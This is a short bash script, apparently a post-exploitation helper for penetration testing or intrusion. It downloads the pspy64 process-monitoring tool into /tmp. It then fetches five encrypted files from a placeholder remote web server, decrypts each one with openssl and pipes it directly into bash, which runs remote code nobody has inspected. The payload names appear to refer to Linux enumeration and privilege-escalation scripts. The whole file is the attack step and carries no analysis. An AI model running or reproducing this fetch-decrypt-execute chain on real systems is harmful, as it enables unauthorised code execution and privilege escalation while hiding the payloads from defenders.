#!/bin/bash

# Assign variables for websrv_ip and websrv_port
websrv_ip="<IPADDRESS>"
websrv_port="<PORT>"

# Function to download and decrypt a file
decrypt_file() {
    filename=$1
    curl "http://${websrv_ip}:${websrv_port}/enc/${filename}" | \
    openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:<PASSWORD> | \
    bash
}

curl "http://${websrv_ip}:${websrv_port}/pspy64" -o /tmp/pspy64
chmod +x /tmp/pspy64

# Call the decrypt_file function for each filename
decrypt_file "le.enc"
decrypt_file "les.enc"
decrypt_file "lp.enc"
decrypt_file "lse.enc"
decrypt_file "ds.enc"

